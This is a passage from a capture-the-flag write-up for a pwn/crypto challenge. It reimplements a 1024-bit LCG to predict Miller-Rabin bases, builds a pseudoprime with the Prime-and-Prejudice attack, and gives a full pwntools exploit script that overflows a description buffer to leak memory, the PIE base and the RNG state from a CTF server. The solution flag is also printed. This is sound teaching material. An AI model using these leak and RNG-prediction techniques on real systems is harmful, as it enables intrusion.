    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">X</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">=</span> <span class="n">X</span> <span class="o">&amp;</span> <span class="n">MASK1024</span>

    <span class="k">def</span> <span class="nf">step</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">=</span> <span class="p">(</span><span class="n">A</span> <span class="o">*</span> <span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">+</span> <span class="n">C</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK1024</span>

    <span class="k">def</span> <span class="nf">high512</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">step</span><span class="p">()</span>
        <span class="k">return</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">&gt;&gt;</span> <span class="n">HALF_BITS</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">HALF_MASK</span>

<span class="k">def</span> <span class="nf">_gmp_rand_bits</span><span class="p">(</span><span class="n">nbits</span><span class="p">,</span> <span class="n">rng</span><span class="p">):</span>
    <span class="n">chunk</span> <span class="o">=</span> <span class="n">rng</span><span class="p">.</span><span class="n">high512</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">nbits</span> <span class="o">&lt;=</span> <span class="n">HALF_BITS</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">chunk</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">nbits</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">out</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">got</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">got</span> <span class="o">&lt;</span> <span class="n">nbits</span><span class="p">:</span>
        <span class="n">take</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">HALF_BITS</span><span class="p">,</span> <span class="n">nbits</span> <span class="o">-</span> <span class="n">got</span><span class="p">)</span>
        <span class="n">out</span> <span class="o">|=</span> <span class="p">(</span><span class="n">chunk</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">take</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="n">got</span>
        <span class="n">got</span> <span class="o">+=</span> <span class="n">take</span>
        <span class="k">if</span> <span class="n">got</span> <span class="o">&lt;</span> <span class="n">nbits</span><span class="p">:</span>
            <span class="n">chunk</span> <span class="o">=</span> <span class="n">rng</span><span class="p">.</span><span class="n">high512</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">out</span>

<span class="k">def</span> <span class="nf">urandomm_mod</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">rng</span><span class="p">):</span>
    <span class="n">size</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span><span class="p">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">63</span><span class="p">)</span> <span class="o">//</span> <span class="mi">64</span>
    <span class="n">nh</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">64</span><span class="o">*</span><span class="p">(</span><span class="n">size</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">64</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">clz</span> <span class="o">=</span> <span class="p">(</span><span class="mi">64</span> <span class="o">-</span> <span class="n">nh</span><span class="p">.</span><span class="n">bit_length</span><span class="p">())</span> <span class="k">if</span> <span class="n">nh</span> <span class="o">!=</span> <span class="mi">0</span> <span class="k">else</span> <span class="mi">64</span>
    <span class="n">pow2</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">if</span> <span class="p">(</span><span class="n">nh</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">nh</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="p">(</span><span class="n">size</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">or</span> <span class="p">(</span><span class="n">n</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">64</span><span class="o">*</span><span class="p">(</span><span class="n">size</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="k">else</span> <span class="mi">0</span>
    <span class="n">nbits</span> <span class="o">=</span> <span class="n">size</span><span class="o">*</span><span class="mi">64</span> <span class="o">-</span> <span class="n">clz</span> <span class="o">-</span> <span class="n">pow2</span>
    <span class="k">if</span> <span class="n">nbits</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">_gmp_rand_bits</span><span class="p">(</span><span class="n">nbits</span><span class="p">,</span> <span class="n">rng</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">r</span>
</code></pre></div></div>

<p>We then  predict the 6 bases with $k$ and $X$:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">predict_bases</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">rounds</span><span class="o">=</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">rng</span> <span class="o">=</span> <span class="n">LCG1024</span><span class="p">(</span><span class="n">X</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">[</span><span class="n">urandomm_mod</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">rng</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">rounds</span><span class="p">)]</span>
    
<span class="n">bases</span> <span class="o">=</span> <span class="n">predict_bases</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">rounds</span><span class="o">=</span><span class="mi">6</span><span class="p">)</span>
</code></pre></div></div>

<h5 id="generating-the-miller-rabin-pseudoprime">Generating the Miller-Rabin pseudoprime</h5>

<p>With the bases, we can use the Prime-and-Prejudice attack against Miller-Rabin with some bases. Implementations exist online, for example from https://github.com/jvdsn/crypto-attacks/blob/master/attacks/pseudoprimes/miller_rabin.py in SageMath.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">N</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span> <span class="o">=</span> <span class="n">generate_pseudoprime</span><span class="p">(</span><span class="n">bases</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Found pseudoprime N = </span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Factor 1 (p1) = </span><span class="si">{</span><span class="n">p1</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Factor 2 (p2*p3) = </span><span class="si">{</span><span class="n">p2</span> <span class="o">*</span> <span class="n">p3</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p>After some waiting, the function returns a pseudoprime $N$ and factors $p_{1},p_{2},p_{3}$. By creating the prime and factoring it, we get our flag:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"0"</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your prime: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Description: "</span><span class="p">,</span><span class="sa">b</span><span class="s">":iku:"</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"4"</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Factor 1: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">p1</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Factor 2: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">p2</span><span class="o">*</span><span class="n">p3</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="c1"># wack{7Hi5_7im3_wi7h_4_5i6n3d_c0mP3ri50N}
</span></code></pre></div></div>

<h5 id="solvesage">Solve.sage</h5>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># ======================== PWN ========================
</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./probableprime2electricboogaloo"</span><span class="p">)</span>
<span class="c1">#io = process("./probableprime2electricboogaloo")
</span><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"ctf.wackattack.eu"</span><span class="p">,</span> <span class="mi">8090</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">create_prime</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">prime</span><span class="p">,</span> <span class="n">desc</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">name</span><span class="p">:</span>
        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Name: "</span><span class="p">)</span>
        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"0"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"prime: "</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">prime</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Description: "</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">desc</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">showcase_prime</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">opt</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">opt</span><span class="p">)</span>
    <span class="n">leak1</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">leak2</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">leak1</span><span class="p">,</span> <span class="n">leak2</span>

<span class="k">def</span> <span class="nf">edit_description</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Description: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">leak_add</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
    <span class="n">edit_description</span><span class="p">(</span><span class="sa">b</span><span class="s">"0"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">))</span>
    <span class="n">name_leak</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">showcase_prime</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">leaked_prefix</span> <span class="o">=</span> <span class="n">name_leak</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">leaked_prefix</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">9</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">create_prime</span><span class="p">(</span><span class="sa">b</span><span class="s">"leak"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"13"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">57</span><span class="p">)</span>
<span class="n">create_prime</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="sa">b</span><span class="s">"11"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"asdf"</span><span class="p">)</span>
<span class="n">prime</span><span class="p">,</span> <span class="n">desc</span> <span class="o">=</span> <span class="n">showcase_prime</span><span class="p">(</span><span class="sa">b</span><span class="s">"0"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">desc</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s">"Description: "</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
<span class="n">bss_leak</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)))</span>
<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">bss_leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x6150</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"PIE = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">k_addr</span> <span class="o">=</span> <span class="n">leak_add</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">k</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
<span class="n">k</span> <span class="o">=</span> <span class="n">leak_add</span><span class="p">(</span><span class="n">k_addr</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"k = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">k</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">algdata_ptr</span> <span class="o">=</span> <span class="n">leak_add</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">st</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"algdata_ptr  = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">algdata_ptr</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">x_ptr</span> <span class="o">=</span> <span class="n">algdata_ptr</span> <span class="o">+</span> <span class="mi">64</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"x_ptr  = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">x_ptr</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">chunks</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
    <span class="n">chunks</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">leak_add</span><span class="p">(</span><span class="n">x_ptr</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)))</span>

<span class="n">Xbytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">chunks</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">Xbytes</span><span class="p">)</span>
<span class="k">assert</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">Xbytes</span>
<span class="n">X</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">Xbytes</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Leaked 1024-bit state X = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># ======================== CRYPTO ========================
</span>
<span class="n">A</span> <span class="o">=</span> <span class="mh">0x5851f42d4c957f2d</span>
<span class="n">C</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">MASK1024</span>  <span class="o">=</span> <span class="mi">2</span><span class="o">^</span><span class="mi">1024</span> <span class="o">-</span> <span class="mi">1</span>
<span class="n">HALF_BITS</span> <span class="o">=</span> <span class="mi">512</span>
<span class="n">HALF_MASK</span> <span class="o">=</span> <span class="mi">2</span><span class="o">^</span><span class="n">HALF_BITS</span> <span class="o">-</span> <span class="mi">1</span>

<span class="k">class</span> <span class="nc">LCG1024</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">X</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">=</span> <span class="n">X</span> <span class="o">&amp;</span> <span class="n">MASK1024</span>

    <span class="k">def</span> <span class="nf">step</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">=</span> <span class="p">(</span><span class="n">A</span> <span class="o">*</span> <span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">+</span> <span class="n">C</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">MASK1024</span>

    <span class="k">def</span> <span class="nf">high512</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">step</span><span class="p">()</span>
        <span class="k">return</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">X</span> <span class="o">&gt;&gt;</span> <span class="n">HALF_BITS</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">HALF_MASK</span>

<span class="k">def</span> <span class="nf">_gmp_rand_bits</span><span class="p">(</span><span class="n">nbits</span><span class="p">,</span> <span class="n">rng</span><span class="p">):</span>
    <span class="n">chunk</span> <span class="o">=</span> <span class="n">rng</span><span class="p">.</span><span class="n">high512</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">nbits</span> <span class="o">&lt;=</span> <span class="n">HALF_BITS</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">chunk</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">nbits</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">out</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">got</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">got</span> <span class="o">&lt;</span> <span class="n">nbits</span><span class="p">:</span>
        <span class="n">take</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">HALF_BITS</span><span class="p">,</span> <span class="n">nbits</span> <span class="o">-</span> <span class="n">got</span><span class="p">)</span>
        <span class="n">out</span> <span class="o">|=</span> <span class="p">(</span><span class="n">chunk</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">take</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="n">got</span>
        <span class="n">got</span> <span class="o">+=</span> <span class="n">take</span>
        <span class="k">if</span> <span class="n">got</span> <span class="o">&lt;</span> <span class="n">nbits</span><span class="p">:</span>
            <span class="n">chunk</span> <span class="o">=</span> <span class="n">rng</span><span class="p">.</span><span class="n">high512</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">out</span>

<span class="k">def</span> <span class="nf">urandomm_mod</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">rng</span><span class="p">):</span>
    <span class="n">size</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span><span class="p">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">63</span><span class="p">)</span> <span class="o">//</span> <span class="mi">64</span>
    <span class="n">nh</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">64</span><span class="o">*</span><span class="p">(</span><span class="n">size</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">64</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">clz</span> <span class="o">=</span> <span class="p">(</span><span class="mi">64</span> <span class="o">-</span> <span class="n">nh</span><span class="p">.</span><span class="n">bit_length</span><span class="p">())</span> <span class="k">if</span> <span class="n">nh</span> <span class="o">!=</span> <span class="mi">0</span> <span class="k">else</span> <span class="mi">64</span>
    <span class="n">pow2</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">if</span> <span class="p">(</span><span class="n">nh</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">nh</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="p">(</span><span class="n">size</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">or</span> <span class="p">(</span><span class="n">n</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">64</span><span class="o">*</span><span class="p">(</span><span class="n">size</span><span class="o">-</span><span class="mi">1</span><span class="p">)))</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="k">else</span> <span class="mi">0</span>
    <span class="n">nbits</span> <span class="o">=</span> <span class="n">size</span><span class="o">*</span><span class="mi">64</span> <span class="o">-</span> <span class="n">clz</span> <span class="o">-</span> <span class="n">pow2</span>
    <span class="k">if</span> <span class="n">nbits</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">_gmp_rand_bits</span><span class="p">(</span><span class="n">nbits</span><span class="p">,</span> <span class="n">rng</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">r</span>

<span class="k">def</span> <span class="nf">predict_bases</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">rounds</span><span class="o">=</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">rng</span> <span class="o">=</span> <span class="n">LCG1024</span><span class="p">(</span><span class="n">X</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">[</span><span class="n">urandomm_mod</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">rng</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">rounds</span><span class="p">)]</span>

<span class="c1"># https://github.com/jvdsn/crypto-attacks/blob/master/shared/crt.py
</span><span class="k">def</span> <span class="nf">fast_crt</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">M</span><span class="p">,</span> <span class="n">segment_size</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
    <span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">lcm</span>
    <span class="s">"""
    Uses a divide-and-conquer algorithm to compute the CRT remainder and least common multiple.
    :param X: the remainders
    :param M: the moduli (not necessarily coprime)
    :param segment_size: the minimum size of the segments (default: 8)
    :return: a tuple containing the remainder and the least common multiple
    """</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">M</span><span class="p">)</span>
